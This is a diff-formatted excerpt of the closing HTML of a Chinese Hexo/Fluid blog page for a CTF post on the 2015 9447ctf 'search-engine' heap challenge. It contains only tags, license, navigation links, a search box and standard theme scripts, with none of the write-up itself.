+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/fastbin-dup/" class="print-no-link">#fastbin dup</a>
+      
+        <a href="/tags/fastbin-dup-into-stack/" class="print-no-link">#fastbin dup into stack</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2015 9447ctf search-engine</div>
+      <div>http://akaieurus.github.io/2023/01/31/2015-9447ctf-search-engine/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Eurus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年1月31日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/02/02/hack-lu-CTF-2014-OREO/" title="2014 hack.lu CTF OREO">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">2014 hack.lu CTF OREO</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/29/fastbin-dup-consolidate/" title="fastbin dup consolidate">
+                        <span class="hidden-mobile">fastbin dup consolidate</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
